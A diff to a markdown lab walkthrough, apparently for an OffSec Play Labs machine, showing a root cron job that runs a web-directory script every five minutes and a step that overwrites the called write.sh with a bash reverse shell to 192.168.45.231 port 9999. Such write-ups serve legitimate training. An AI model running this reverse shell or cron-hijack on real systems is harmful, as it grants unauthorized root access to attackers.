@@ -215,6 +215,11 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 */5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh
 ```
 
+```
+https://crontab.guru/#*/5_*_*_*_*
+```
+![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/79d4c817-c88c-4ca6-a9cb-a15efc23e576)
+
 finally.sh
 ```
 #!/bin/sh
@@ -229,3 +234,9 @@ write.sh
 touch /tmp/gateway
 www-data@sar:/var/www/html$ 
 ```
+
+Overwrite the contents of write.sh
+```
+www-data@sar:/var/www/html$ echo "bash -i >& /dev/tcp/192.168.45.231/9999 0>&1" > write.sh
+```
+![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/3c68e5f7-0b2f-44fa-94fa-ab033bbfd3da)
